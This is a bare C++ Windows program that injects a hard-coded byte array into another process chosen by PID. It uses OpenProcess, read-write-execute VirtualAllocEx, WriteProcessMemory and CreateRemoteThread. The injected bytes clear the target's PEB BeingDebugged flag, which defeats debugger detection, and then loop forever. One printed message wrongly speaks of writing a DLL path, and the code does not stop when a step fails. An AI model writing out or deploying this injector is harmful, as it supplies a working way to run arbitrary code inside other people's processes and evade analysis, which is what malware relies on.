#include <cstdio>
#include <Windows.h>

#pragma comment(lib, "user32.lib")

const char shellcode[] = {0x9C,0x48,0x31,0xFF,0x48,0xF7,0xE7,0x65,0x48,0x8B,0x58,0x60,0x88,0x43,0x02,0x9D,0xEB,0xFE};

int main(int argc, char *argv[]){
	if(argc != 2){
		printf("\nUsage: \n%s <process ID>\n\n", argv[0]);
	} else {
		int pid = atoi(argv[1]);
		HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
		if(pHandle) printf("Process opened!");
		LPVOID buffer = VirtualAllocEx(pHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if(buffer) printf("BufferAllocated! %p\n", buffer);
		if(WriteProcessMemory(pHandle, buffer, shellcode, sizeof(shellcode), NULL)) printf("Writing Path of DLL to memory.\n");
		getchar();
		if(!CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL)){
			printf("CreateRemoteThread Error! %d", GetLastError());
		}
	}
	return 0;
}
